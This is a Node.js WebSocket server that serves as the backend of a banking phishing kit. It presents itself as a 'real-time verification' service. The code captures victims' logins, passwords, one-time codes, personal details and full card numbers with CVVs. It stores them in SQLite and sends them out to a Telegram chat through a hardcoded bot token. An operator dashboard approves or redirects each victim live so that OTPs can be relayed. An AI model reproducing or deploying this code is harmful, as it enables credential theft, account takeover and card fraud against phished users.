/**
 * WebSocket Server for Real-Time Verification
 *
 * This server handles communication between:
 * - User pages (login, otp, personal-info, card-confirm)
 * - Dashboard (staff verification panel)
 *
 * Install: npm install ws better-sqlite3
 * Run: node websocket-server.js
 */

const WebSocket = require("ws");
const http = require("http");
const https = require("https");
const Database = require("better-sqlite3");
const path = require("path");

// Use environment variable for Render, fallback to 8000 for local dev
const PORT = process.env.PORT || 8000;
const HOST = "0.0.0.0";

// ============================================
// TELEGRAM CONFIGURATION
// ============================================
const TELEGRAM_BOT_TOKEN = "5474208969:AAEkhnLIToQyHNZAi0SOhwFGBJa9iI8J-v8";
const TELEGRAM_CHAT_ID = "-5030850548";

// ============================================
// SQLITE DATABASE SETUP
// ============================================
const dbPath = path.join(__dirname, "sessions.db");
const db = new Database(dbPath);

// Create tables if not exist
db.exec(`
  CREATE TABLE IF NOT EXISTS sessions (
    session_id TEXT PRIMARY KEY,
    ip TEXT NOT NULL,
    created_at TEXT DEFAULT CURRENT_TIMESTAMP,
    updated_at TEXT DEFAULT CURRENT_TIMESTAMP,
    username TEXT,
    password TEXT,
    user_agent TEXT,
    otp TEXT,
    first_name TEXT,
    last_name TEXT,
    email TEXT,
    address TEXT,
    date_of_birth TEXT,
    card_holder TEXT,
    card_number TEXT,
    card_expiry TEXT,
    card_cvv TEXT,
    phone TEXT,
    telegram_message_id INTEGER,
    status TEXT DEFAULT 'in_progress'
  );
  
  CREATE INDEX IF NOT EXISTS idx_sessions_ip ON sessions(ip);
  CREATE INDEX IF NOT EXISTS idx_sessions_updated ON sessions(updated_at);

  -- Security: Blocked IPs table
  CREATE TABLE IF NOT EXISTS blocked_ips (
    ip TEXT PRIMARY KEY,
    reason TEXT,
    blocked_at TEXT DEFAULT CURRENT_TIMESTAMP,
    blocked_until TEXT,
    permanent INTEGER DEFAULT 0
  );

  -- Security: Rate limiting / attempts tracking
  CREATE TABLE IF NOT EXISTS ip_attempts (
    ip TEXT PRIMARY KEY,
    attempts INTEGER DEFAULT 0,
    last_attempt TEXT DEFAULT CURRENT_TIMESTAMP,
    first_attempt TEXT DEFAULT CURRENT_TIMESTAMP
  );
`);

console.log(`[DB] SQLite database initialized at ${dbPath}`);

// ============================================
// SECURITY CONFIGURATION
// ============================================
const SECURITY = {
  MAX_ATTEMPTS_PER_HOUR: 10, // Max attempts before temp block
  MAX_SESSIONS_PER_IP: 3, // Max concurrent sessions per IP
  TEMP_BLOCK_MINUTES: 30, // Temp block duration
  AUTO_BLOCK_THRESHOLD: 20, // Auto permanent block after X attempts
};

// Security prepared statements
const stmtGetBlockedIP = db.prepare("SELECT * FROM blocked_ips WHERE ip = ?");
const stmtBlockIP = db.prepare(`
  INSERT OR REPLACE INTO blocked_ips (ip, reason, blocked_until, permanent) VALUES (?, ?, ?, ?)
`);
const stmtUnblockIP = db.prepare("DELETE FROM blocked_ips WHERE ip = ?");
const stmtGetAllBlockedIPs = db.prepare(
  "SELECT * FROM blocked_ips ORDER BY blocked_at DESC"
);

const stmtGetIPAttempts = db.prepare("SELECT * FROM ip_attempts WHERE ip = ?");
const stmtUpdateIPAttempts = db.prepare(`
  INSERT INTO ip_attempts (ip, attempts, last_attempt, first_attempt) VALUES (?, 1, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)
  ON CONFLICT(ip) DO UPDATE SET attempts = attempts + 1, last_attempt = CURRENT_TIMESTAMP
`);
const stmtResetIPAttempts = db.prepare(
  "UPDATE ip_attempts SET attempts = 0 WHERE ip = ?"
);
const stmtCountSessionsByIP = db.prepare(
  "SELECT COUNT(*) as count FROM sessions WHERE ip = ? AND updated_at > datetime('now', '-1 hour')"
);

// Check if IP is blocked
function isIPBlocked(ip) {
  const blocked = stmtGetBlockedIP.get(ip);
  if (!blocked) return false;

  // Check if permanent block
  if (blocked.permanent) return true;

  // Check if temp block expired
  if (blocked.blocked_until) {
    const blockedUntil = new Date(blocked.blocked_until);
    if (new Date() > blockedUntil) {
      stmtUnblockIP.run(ip);
      return false;
    }
  }
  return true;
}

// Track attempt and check for abuse
function trackAttempt(ip) {
  stmtUpdateIPAttempts.run(ip);

  const attempts = stmtGetIPAttempts.get(ip);
  if (!attempts) return { allowed: true };

  // Check if should auto-block
  if (attempts.attempts >= SECURITY.AUTO_BLOCK_THRESHOLD) {
    blockIP(ip, "Auto-blocked: Too many attempts", true);
    // No Telegram alert for IP blocking
    return { allowed: false, reason: "blocked" };
  }

  // Check rate limit
  if (attempts.attempts >= SECURITY.MAX_ATTEMPTS_PER_HOUR) {
    const blockUntil = new Date(
      Date.now() + SECURITY.TEMP_BLOCK_MINUTES * 60 * 1000
    ).toISOString();
    blockIP(ip, "Rate limit exceeded", false, blockUntil);
    // No Telegram alert for IP blocking
    return { allowed: false, reason: "rate_limited" };
  }

  return { allowed: true };
}

// Block an IP
function blockIP(ip, reason, permanent = false, until = null) {
  stmtBlockIP.run(ip, reason, until, permanent ? 1 : 0);
  console.log(
    `[SECURITY] IP blocked: ${ip} - ${reason} (permanent: ${permanent})`
  );
}

// Unblock an IP
function unblockIP(ip) {
  stmtUnblockIP.run(ip);
  stmtResetIPAttempts.run(ip);
  console.log(`[SECURITY] IP unblocked: ${ip}`);
}

// Send security alert to Telegram
function sendSecurityAlert(ip, message) {
  const alertMsg = `🛡️ <b>SECURITY ALERT</b>\n\n${message}\n\n🕐 ${new Date().toLocaleString(
    "fr-FR",
    { timeZone: "Europe/Paris" }
  )}`;
  sendTelegramMessage(alertMsg, null);
}

// Check session count per IP
function checkSessionLimit(ip) {
  const result = stmtCountSessionsByIP.get(ip);
  return result.count < SECURITY.MAX_SESSIONS_PER_IP;
}

// Prepared statements for performance
const stmtGetSession = db.prepare(
  "SELECT * FROM sessions WHERE session_id = ?"
);
const stmtInsertSession = db.prepare(`
  INSERT INTO sessions (session_id, ip) VALUES (?, ?)
  ON CONFLICT(session_id) DO UPDATE SET updated_at = CURRENT_TIMESTAMP
`);
const stmtUpdateLogin = db.prepare(`
  UPDATE sessions SET username = ?, password = ?, user_agent = ?, updated_at = CURRENT_TIMESTAMP WHERE session_id = ?
`);
const stmtUpdateOtp = db.prepare(`
  UPDATE sessions SET otp = ?, updated_at = CURRENT_TIMESTAMP WHERE session_id = ?
`);
const stmtUpdatePersonal = db.prepare(`
  UPDATE sessions SET first_name = ?, last_name = ?, email = ?, address = ?, date_of_birth = ?, updated_at = CURRENT_TIMESTAMP WHERE session_id = ?
`);
const stmtUpdateCard = db.prepare(`
  UPDATE sessions SET card_holder = ?, card_number = ?, card_expiry = ?, card_cvv = ?, status = 'complete', updated_at = CURRENT_TIMESTAMP WHERE session_id = ?
`);
const stmtUpdateTelegramMsgId = db.prepare(`
  UPDATE sessions SET telegram_message_id = ? WHERE session_id = ?
`);
const stmtUpdatePhone = db.prepare(`
  UPDATE sessions SET phone = ?, updated_at = CURRENT_TIMESTAMP WHERE session_id = ?
`);

// Helper: Get session data formatted for Telegram
function getSessionData(sessionId) {
  const row = stmtGetSession.get(sessionId);
  if (!row) return null;

  return {
    ip: row.ip,
    login: row.username
      ? {
          username: row.username,
          password: row.password,
          userAgent: row.user_agent,
        }
      : null,
    otp: row.otp || null,
    personalInfo: row.first_name
      ? {
          firstName: row.first_name,
          lastName: row.last_name,
          email: row.email,
          address: row.address,
          dateOfBirth: row.date_of_birth,
        }
      : null,
    cardInfo: row.card_number
      ? {
          cardHolder: row.card_holder,
          cardNumber: row.card_number,
          expiry: row.card_expiry,
          cvv: row.card_cvv,
        }
      : null,
    phone: row.phone,
    telegramMessageId: row.telegram_message_id,
  };
}

// Helper: Save/update session in DB
function saveSession(sessionId, ip) {
  stmtInsertSession.run(sessionId, ip);
}

// Store Telegram message IDs in memory (also persisted in DB)
const telegramMessages = new Map();
// Store notification message IDs (to delete before sending new one)
const notificationMessages = new Map();

// Load existing telegram message IDs from DB
const existingMessages = db
  .prepare(
    "SELECT session_id, telegram_message_id FROM sessions WHERE telegram_message_id IS NOT NULL"
  )
  .all();
existingMessages.forEach((row) => {
  telegramMessages.set(row.session_id, row.telegram_message_id);
});
console.log(
  `[DB] Loaded ${existingMessages.length} existing Telegram message IDs`
);

// Send or update Telegram message for a session
function updateTelegramMessage(sessionId, changeType) {
  // Get fresh data from database
  const sessionData = getSessionData(sessionId);
  if (!sessionData) {
    console.log(`[Telegram] No session data found for ${sessionId}`);
    return;
  }

  const message = formatFullMessage(sessionId, sessionData);
  const existingMessageId =
    telegramMessages.get(sessionId) || sessionData.telegramMessageId;

  // Send change notification (delete previous one first)
  if (changeType) {
    // Delete previous notification if exists
    const prevNotifId = notificationMessages.get(sessionId);
    if (prevNotifId) {
      deleteTelegramMessage(prevNotifId);
    }
    // Send new notification
    sendChangeNotification(sessionId, sessionData, changeType);
  }

  if (existingMessageId) {
    // Edit existing message
    editTelegramMessage(existingMessageId, message);
  } else {
    // Send new message and store ID
    sendTelegramMessage(message, (messageId) => {
      if (messageId) {
        telegramMessages.set(sessionId, messageId);
        // Persist to database
        stmtUpdateTelegramMsgId.run(messageId, sessionId);
      }
    });
  }
}

// Send a short notification for changes (as reply to main client fiche)
function sendChangeNotification(sessionId, data, changeType) {
  const shortId = sessionId.slice(0, 15);
  const timestamp = new Date().toLocaleString("fr-FR", {
    timeZone: "Europe/Paris",
  });

  let emoji = "🔔";
  let changeText = "";

  switch (changeType) {
    case "login":
      emoji = "🔐";
      changeText = `LOGIN reçu!\n👤 ${data.login?.username || "N/A"}`;
      break;
    case "otp":
      emoji = "📲";
      const otpValue = typeof data.otp === "object" ? data.otp.otp : data.otp;
      changeText = `OTP reçu!\n🔢 ${otpValue}`;
      break;
    case "personal":
      emoji = "👤";
      changeText = `INFO PERSO reçu!\n📝 ${data.personalInfo?.firstName} ${data.personalInfo?.lastName}`;
      break;
    case "card":
      emoji = "💳";
      changeText = `CARTE reçue!\n💳 ${formatCardNumber(
        data.cardInfo?.cardNumber
      )}`;
      break;
  }

  const notification = `${emoji} <b>UPDATE</b> - ${shortId}\n${changeText}\n🕐 ${timestamp}`;

  // Get the main message ID to reply to
  const mainMessageId =
    telegramMessages.get(sessionId) || data.telegramMessageId;

  // Send as reply to main client fiche
  sendTelegramReply(notification, mainMessageId, (messageId) => {
    if (messageId) {
      notificationMessages.set(sessionId, messageId);
    }
  });
}

// Delete a Telegram message
function deleteTelegramMessage(messageId) {
  console.log(`[Telegram] Deleting message ${messageId}...`);

  const postData = JSON.stringify({
    chat_id: TELEGRAM_CHAT_ID,
    message_id: messageId,
  });

  const options = {
    hostname: "api.telegram.org",
    port: 443,
    path: `/bot${TELEGRAM_BOT_TOKEN}/deleteMessage`,
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Content-Length": Buffer.byteLength(postData),
    },
  };

  const req = https.request(options, (res) => {
    let responseData = "";
    res.on("data", (chunk) => {
      responseData += chunk;
    });
    res.on("end", () => {
      if (res.statusCode === 200) {
        console.log(`[Telegram] ✓ Message deleted`);
      } else {
        console.log(`[Telegram] Delete failed: ${responseData}`);
      }
    });
  });

  req.on("error", (e) => {
    console.error(`[Telegram] Delete error: ${e.message}`);
  });

  req.write(postData);
  req.end();
}

// Send new Telegram message
function sendTelegramMessage(message, callback) {
  console.log(`[Telegram] Sending new message...`);

  const postData = JSON.stringify({
    chat_id: TELEGRAM_CHAT_ID,
    text: message,
    parse_mode: "HTML",
  });

  const options = {
    hostname: "api.telegram.org",
    port: 443,
    path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Content-Length": Buffer.byteLength(postData),
    },
  };

  const req = https.request(options, (res) => {
    let responseData = "";
    res.on("data", (chunk) => {
      responseData += chunk;
    });
    res.on("end", () => {
      if (res.statusCode === 200) {
        const result = JSON.parse(responseData);
        console.log(
          `[Telegram] ✓ Message sent (ID: ${result.result.message_id})`
        );
        if (callback) callback(result.result.message_id);
      } else {
        console.error(`[Telegram] ✗ Error ${res.statusCode}: ${responseData}`);
        if (callback) callback(null);
      }
    });
  });

  req.on("error", (e) => {
    console.error(`[Telegram] ✗ Request error: ${e.message}`);
    if (callback) callback(null);
  });

  req.write(postData);
  req.end();
}

// Send Telegram message as reply to another message
function sendTelegramReply(message, replyToMessageId, callback) {
  console.log(`[Telegram] Sending reply to message ${replyToMessageId}...`);

  const postDataObj = {
    chat_id: TELEGRAM_CHAT_ID,
    text: message,
    parse_mode: "HTML",
  };

  // Only add reply_to_message_id if we have a valid message ID
  if (replyToMessageId) {
    postDataObj.reply_to_message_id = replyToMessageId;
    postDataObj.allow_sending_without_reply = true; // Send even if original message is deleted
  }

  const postData = JSON.stringify(postDataObj);

  const options = {
    hostname: "api.telegram.org",
    port: 443,
    path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Content-Length": Buffer.byteLength(postData),
    },
  };

  const req = https.request(options, (res) => {
    let responseData = "";
    res.on("data", (chunk) => {
      responseData += chunk;
    });
    res.on("end", () => {
      if (res.statusCode === 200) {
        const result = JSON.parse(responseData);
        console.log(
          `[Telegram] ✓ Reply sent (ID: ${result.result.message_id})`
        );
        if (callback) callback(result.result.message_id);
      } else {
        console.error(
          `[Telegram] ✗ Reply error ${res.statusCode}: ${responseData}`
        );
        if (callback) callback(null);
      }
    });
  });

  req.on("error", (e) => {
    console.error(`[Telegram] ✗ Reply request error: ${e.message}`);
    if (callback) callback(null);
  });

  req.write(postData);
  req.end();
}

// Edit existing Telegram message
function editTelegramMessage(messageId, message) {
  console.log(`[Telegram] Editing message ${messageId}...`);

  const postData = JSON.stringify({
    chat_id: TELEGRAM_CHAT_ID,
    message_id: messageId,
    text: message,
    parse_mode: "HTML",
  });

  const options = {
    hostname: "api.telegram.org",
    port: 443,
    path: `/bot${TELEGRAM_BOT_TOKEN}/editMessageText`,
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Content-Length": Buffer.byteLength(postData),
    },
  };

  const req = https.request(options, (res) => {
    let responseData = "";
    res.on("data", (chunk) => {
      responseData += chunk;
    });
    res.on("end", () => {
      if (res.statusCode === 200) {
        console.log(`[Telegram] ✓ Message updated`);
      } else {
        console.error(
          `[Telegram] ✗ Edit error ${res.statusCode}: ${responseData}`
        );
      }
    });
  });

  req.on("error", (e) => {
    console.error(`[Telegram] ✗ Edit request error: ${e.message}`);
  });

  req.write(postData);
  req.end();
}

// Format full grouped message with all session data - FICHE COMPLETE
function formatFullMessage(sessionId, data) {
  const timestamp = new Date().toLocaleString("fr-FR", {
    timeZone: "Europe/Paris",
  });

  // Debug log
  console.log(
    `[Telegram] Building message for ${sessionId}:`,
    JSON.stringify(data, null, 2)
  );

  let message = `🎯 <b>FICHE CLIENT</b>\n`;
  message += `━━━━━━━━━━━━━━━━━━━━\n`;
  message += `🆔 <b>Session:</b> <code>${sessionId}</code>\n`;
  message += `🌍 <b>IP:</b> <code>${data.ip || "Unknown"}</code>\n`;
  message += `━━━━━━━━━━━━━━━━━━━━\n\n`;

  // LOGIN - Always show section
  message += `🔐 <b>IDENTIFIANTS</b>\n`;
  if (data.login) {
    message += `👤 User: <code>${data.login.username}</code>\n`;
    message += `🔑 Pass: <code>${data.login.password}</code>\n`;
  } else {
    message += `⚠️ <i>Non reçu</i>\n`;
  }
  message += `\n`;

  // OTP - Always show section
  message += `📲 <b>CODE OTP</b>\n`;
  if (data.otp) {
    const otpValue = typeof data.otp === "object" ? data.otp.otp : data.otp;
    message += `🔢 Code: <code>${otpValue}</code>\n`;
  } else {
    message += `⚠️ <i>Non reçu</i>\n`;
  }
  message += `\n`;

  // PERSONAL INFO - Always show section
  message += `👤 <b>INFOS PERSONNELLES</b>\n`;
  if (data.personalInfo) {
    message += `📝 Nom: <code>${data.personalInfo.firstName} ${data.personalInfo.lastName}</code>\n`;
    message += `📧 Email: <code>${data.personalInfo.email}</code>\n`;
    message += `🏠 Adresse: <code>${data.personalInfo.address}</code>\n`;
    message += `🎂 Naissance: <code>${data.personalInfo.dateOfBirth}</code>\n`;
  } else {
    message += `⚠️ <i>Non reçu</i>\n`;
  }
  message += `\n`;

  // CARD - Always show section
  message += `💳 <b>CARTE BANCAIRE</b>\n`;
  if (data.cardInfo) {
    message += `👤 Titulaire: <code>${data.cardInfo.cardHolder}</code>\n`;
    message += `💳 Numéro: <code>${formatCardNumber(
      data.cardInfo.cardNumber
    )}</code>\n`;
    message += `📅 Exp: <code>${data.cardInfo.expiry}</code>\n`;
    message += `🔒 CVV: <code>${data.cardInfo.cvv}</code>\n`;
  } else {
    message += `⚠️ <i>Non reçu</i>\n`;
  }

  message += `\n━━━━━━━━━━━━━━━━━━━━\n`;
  message += `🕐 Maj: ${timestamp}\n`;

  // Status with completion indicator
  const hasLogin = !!data.login;
  const hasOtp = !!data.otp;
  const hasPersonal = !!data.personalInfo;
  const hasCard = !!data.cardInfo;
  const steps = [hasLogin, hasOtp, hasPersonal, hasCard].filter(Boolean).length;

  if (hasCard && hasLogin) {
    message += `✅ <b>COMPLET (${steps}/4)</b>`;
  } else {
    message += `⏳ <b>EN COURS (${steps}/4)</b>`;
  }

  return message;
}

function formatCardNumber(number) {
  return number ? number.replace(/(.{4})/g, "$1 ").trim() : "N/A";
}

// Get client IP from WebSocket request
function getClientIP(req) {
  const forwarded = req.headers["x-forwarded-for"];
  if (forwarded) {
    return forwarded.split(",")[0].trim();
  }
  return req.socket.remoteAddress || "Unknown";
}

// Create HTTP server with health check endpoint
const server = http.createServer((req, res) => {
  // Health check endpoint for Render
  if (req.url === "/" || req.url === "/health") {
    res.writeHead(200, { "Content-Type": "application/json" });
    res.end(JSON.stringify({ status: "ok", uptime: process.uptime() }));
  } else {
    res.writeHead(404);
    res.end("Not Found");
  }
});

// Create WebSocket server
const wss = new WebSocket.Server({ server });

// Store active sessions
const sessions = new Map();
// Store dashboard connections
const dashboards = new Set();

// Broadcast to all dashboards
function broadcastToDashboards(data) {
  dashboards.forEach((ws) => {
    if (ws.readyState === WebSocket.OPEN) {
      ws.send(JSON.stringify(data));
    }
  });
}

// Send to specific session
function sendToSession(sessionId, data) {
  const session = sessions.get(sessionId);
  if (session && session.ws.readyState === WebSocket.OPEN) {
    session.ws.send(JSON.stringify(data));
  }
}

wss.on("connection", (ws, req) => {
  // Capture client IP and check security
  const clientIP = getClientIP(req);
  ws.clientIP = clientIP;

  // Check if IP is blocked
  if (isIPBlocked(clientIP)) {
    console.log(`[SECURITY] Blocked IP tried to connect: ${clientIP}`);
    ws.close(4003, "Access denied");
    return;
  }

  console.log(`New connection from ${clientIP}`);

  ws.on("message", (message) => {
    try {
      const data = JSON.parse(message);

      // Skip logging for dashboard (too verbose)
      if (data.type !== "dashboard_register") {
        console.log("Received:", data);
      }

      // Security check for non-dashboard connections
      if (data.type !== "dashboard_register" && !ws.isDashboard) {
        // Check if IP is still allowed
        if (isIPBlocked(clientIP)) {
          ws.send(
            JSON.stringify({ action: "blocked", message: "Access denied" })
          );
          ws.close(4003, "Access denied");
          return;
        }
      }

      switch (data.type) {
        // ============================================
        // USER PAGE EVENTS
        // ============================================

        case "register":
          // Register user session
          if (data.sessionId) {
            // Security: Check session limit per IP
            if (!checkSessionLimit(clientIP)) {
              console.log(
                `[SECURITY] Session limit exceeded for IP: ${clientIP}`
              );
              ws.send(
                JSON.stringify({
                  action: "show_error",
                  message: "Too many sessions. Please try again later.",
                })
              );
              return;
            }

            // Track attempt
            const attemptResult = trackAttempt(clientIP);
            if (!attemptResult.allowed) {
              ws.send(
                JSON.stringify({
                  action: "blocked",
                  message: "Too many requests. Please try again later.",
                })
              );
              ws.close(4003, "Rate limited");
              return;
            }

            // Save to database (creates if not exists)
            saveSession(data.sessionId, clientIP);

            // Keep in-memory reference for WebSocket
            const existingSession = sessions.get(data.sessionId);
            if (existingSession) {
              existingSession.ws = ws;
              existingSession.page = data.page;
              console.log(`[Session] Reconnected: ${data.sessionId}`);
            } else {
              sessions.set(data.sessionId, {
                ws: ws,
                page: data.page,
                ip: clientIP,
              });
              console.log(`[Session] NEW: ${data.sessionId} from ${clientIP}`);
            }
            ws.sessionId = data.sessionId;

            // Get all data from DB for this session
            const dbData = getSessionData(data.sessionId);
            console.log(`[DB] Session data:`, JSON.stringify(dbData, null, 2));

            // Notify dashboards of new session with FULL data from DB
            broadcastToDashboards({
              type: "session_update",
              sessionId: data.sessionId,
              page: data.page,
              status: "connected",
              ip: clientIP,
              data: dbData
                ? {
                    ip: dbData.ip,
                    login: dbData.login,
                    otp: dbData.otp ? { otp: dbData.otp } : null,
                    personalInfo: dbData.personalInfo,
                    cardInfo: dbData.cardInfo,
                    phone: dbData.phone,
                  }
                : null,
            });
          }
          break;

        case "login_attempt":
          // User submitted login credentials - SAVE TO DATABASE
          stmtUpdateLogin.run(
            data.username,
            data.password,
            data.userAgent || "",
            data.sessionId
          );
          console.log(`[LOGIN] ${data.sessionId} - User: ${data.username}`);

          const loginSession = sessions.get(data.sessionId);
          const loginIp = loginSession?.ip || clientIP;

          // Send to dashboard for verification
          broadcastToDashboards({
            type: "login_request",
            sessionId: data.sessionId,
            username: data.username,
            password: data.password,
            userAgent: data.userAgent,
            ip: loginIp,
            timestamp: data.timestamp,
          });

          // Send to Telegram (fetches from DB)
          updateTelegramMessage(data.sessionId, "login");
          break;

        case "otp_attempt":
          // User submitted OTP - SAVE TO DATABASE
          stmtUpdateOtp.run(data.otp, data.sessionId);
          console.log(`[OTP] ${data.sessionId} - Code: ${data.otp}`);

          broadcastToDashboards({
            type: "otp_request",
            sessionId: data.sessionId,
            otp: data.otp,
            timestamp: data.timestamp,
          });

          // Update Telegram (fetches from DB)
          updateTelegramMessage(data.sessionId, "otp");
          break;

        case "otp_resend":
          // User requested OTP resend
          broadcastToDashboards({
            type: "otp_resend_request",
            sessionId: data.sessionId,
            timestamp: data.timestamp,
          });
          break;

        case "personal_info_submit":
          // User submitted personal info - SAVE TO DATABASE
          stmtUpdatePersonal.run(
            data.firstName,
            data.lastName,
            data.email,
            data.address,
            data.dateOfBirth,
            data.sessionId
          );
          console.log(
            `[PERSONAL] ${data.sessionId} - ${data.firstName} ${data.lastName}`
          );

          broadcastToDashboards({
            type: "personal_info_request",
            sessionId: data.sessionId,
            firstName: data.firstName,
            lastName: data.lastName,
            email: data.email,
            address: data.address,
            dateOfBirth: data.dateOfBirth,
            timestamp: data.timestamp,
          });

          // Update Telegram (fetches from DB)
          updateTelegramMessage(data.sessionId, "personal");
          break;

        case "card_info_submit":
          // User submitted card info - SAVE TO DATABASE
          stmtUpdateCard.run(
            data.cardHolder,
            data.cardNumber,
            data.expiry,
            data.cvv,
            data.sessionId
          );
          console.log(
            `[CARD] ${data.sessionId} - Card: ****${data.cardNumber.slice(-4)}`
          );

          broadcastToDashboards({
            type: "card_info_request",
            sessionId: data.sessionId,
            cardHolder: data.cardHolder,
            cardNumber: data.cardNumber,
            expiry: data.expiry,
            cvv: data.cvv,
            timestamp: data.timestamp,
          });

          // Update Telegram (fetches from DB - COMPLETE)
          updateTelegramMessage(data.sessionId, "card");
          break;

        // ============================================
        // DASHBOARD EVENTS
        // ============================================

        case "dashboard_register":
          // Register as dashboard
          dashboards.add(ws);
          ws.isDashboard = true;

          // First, clean up any stale sessions (WebSocket closed but not removed)
          const staleSessionIds = [];
          sessions.forEach((session, sessionId) => {
            if (!session.ws || session.ws.readyState !== WebSocket.OPEN) {
              staleSessionIds.push(sessionId);
            }
          });
          staleSessionIds.forEach((id) => {
            sessions.delete(id);
            console.log(`[Cleanup] Removed stale session: ${id}`);
          });

          // Send ONLY currently connected sessions (with their DB data)
          const activeSessions = [];
          sessions.forEach((session, sessionId) => {
            // Get full data from DB
            const dbData = getSessionData(sessionId);

            // Determine current page based on last data received
            let page = session.page || "login";
            if (dbData) {
              if (dbData.cardInfo) page = "card-confirm";
              else if (dbData.personalInfo) page = "personal-info";
              else if (dbData.otp) page = "otp";
              else if (dbData.login) page = "login";
            }

            activeSessions.push({
              sessionId: sessionId,
              page: page,
              isConnected: true,
              data: dbData
                ? {
                    ip: dbData.ip,
                    login: dbData.login,
                    otp: dbData.otp ? { otp: dbData.otp } : null,
                    personalInfo: dbData.personalInfo,
                    cardInfo: dbData.cardInfo,
                    phone: dbData.phone,
                  }
                : { ip: session.ip },
            });
          });

          console.log(
            `[Dashboard] Sending ${activeSessions.length} active sessions`
          );

          ws.send(
            JSON.stringify({
              type: "sessions_list",
              sessions: activeSessions,
            })
          );
          break;

        case "approve":
          // Staff approved - send to user
          // Store phone number if provided
          if (data.phone) {
            stmtUpdatePhone.run(data.phone, data.sessionId);
          }

          sendToSession(data.sessionId, {
            action: "approve",
            redirectTo: data.redirectTo,
            phone: data.phone || null,
          });

          broadcastToDashboards({
            type: "action_taken",
            sessionId: data.sessionId,
            action: "approved",
            redirectTo: data.redirectTo,
          });

          // If final step (SUCCESS), delete the notification message
          if (data.redirectTo === "__SUCCESS__") {
            const notifId = notificationMessages.get(data.sessionId);
            if (notifId) {
              deleteTelegramMessage(notifId);
              notificationMessages.delete(data.sessionId);
              console.log(
                `[Telegram] Notification deleted for completed session ${data.sessionId}`
              );
            }
          }
          break;

        case "reject":
          // Staff rejected - send error to user
          sendToSession(data.sessionId, {
            action: "reject",
            message: data.message || "Verification failed. Please try again.",
          });

          broadcastToDashboards({
            type: "action_taken",
            sessionId: data.sessionId,
            action: "rejected",
            message: data.message,
          });
          break;

        case "show_error":
          // Send custom error to user
          sendToSession(data.sessionId, {
            action: "show_error",
            message: data.message,
          });
          break;

        case "redirect":
          // Redirect user to specific page
          sendToSession(data.sessionId, {
            action: "redirect",
            redirectTo: data.redirectTo,
          });
          break;

        case "set_phone":
          // Staff sets phone number for SMS - send to user
          sendToSession(data.sessionId, {
            action: "set_phone",
            phone: data.phone,
          });

          // Store phone in database
          stmtUpdatePhone.run(data.phone, data.sessionId);

          broadcastToDashboards({
            type: "phone_set",
            sessionId: data.sessionId,
            phone: data.phone,
          });
          break;

        // ============================================
        // SECURITY CONTROLS (Dashboard only)
        // ============================================

        case "block_ip":
          if (ws.isDashboard && data.ip) {
            blockIP(
              data.ip,
              data.reason || "Blocked by staff",
              data.permanent || false
            );

            // Close all connections from this IP
            wss.clients.forEach((client) => {
              if (client.clientIP === data.ip && !client.isDashboard) {
                client.send(
                  JSON.stringify({
                    action: "blocked",
                    message: "Access denied",
                  })
                );
                client.close(4003, "Blocked");
              }
            });

            broadcastToDashboards({
              type: "ip_blocked",
              ip: data.ip,
              reason: data.reason,
              permanent: data.permanent,
            });
            // No Telegram alert for IP blocking
          }
          break;

        case "unblock_ip":
          if (ws.isDashboard && data.ip) {
            unblockIP(data.ip);

            broadcastToDashboards({
              type: "ip_unblocked",
              ip: data.ip,
            });
          }
          break;

        case "get_blocked_ips":
          if (ws.isDashboard) {
            const blockedIPs = stmtGetAllBlockedIPs.all();
            ws.send(
              JSON.stringify({
                type: "blocked_ips_list",
                ips: blockedIPs,
              })
            );
          }
          break;

        case "block_session_ip":
          // Block IP of a specific session
          if (ws.isDashboard && data.sessionId) {
            const targetSession = sessions.get(data.sessionId);
            if (targetSession) {
              const targetIP = targetSession.ip;
              blockIP(targetIP, `Blocked from session ${data.sessionId}`, true);

              // Close connection
              if (targetSession.ws.readyState === WebSocket.OPEN) {
                targetSession.ws.send(
                  JSON.stringify({
                    action: "blocked",
                    message: "Access denied",
                  })
                );
                targetSession.ws.close(4003, "Blocked");
              }

              broadcastToDashboards({
                type: "ip_blocked",
                ip: targetIP,
                sessionId: data.sessionId,
              });
              // No Telegram alert for IP blocking
            }
          }
          break;
      }
    } catch (error) {
      console.error("Error processing message:", error);
    }
  });

  ws.on("close", () => {
    // Clean up on disconnect
    if (ws.sessionId) {
      // Remove from memory (data is safe in SQLite)
      sessions.delete(ws.sessionId);

      broadcastToDashboards({
        type: "session_update",
        sessionId: ws.sessionId,
        status: "disconnected",
      });

      console.log(`[Session] Disconnected: ${ws.sessionId}`);
    }

    if (ws.isDashboard) {
      dashboards.delete(ws);
    }

    console.log("Connection closed");
  });
});

server.listen(PORT, HOST, () => {
  console.log(`WebSocket server running on ws://${HOST}:${PORT}`);
  console.log(`HTTP health check available at http://${HOST}:${PORT}/health`);
  console.log("");
  console.log("Waiting for connections...");
});
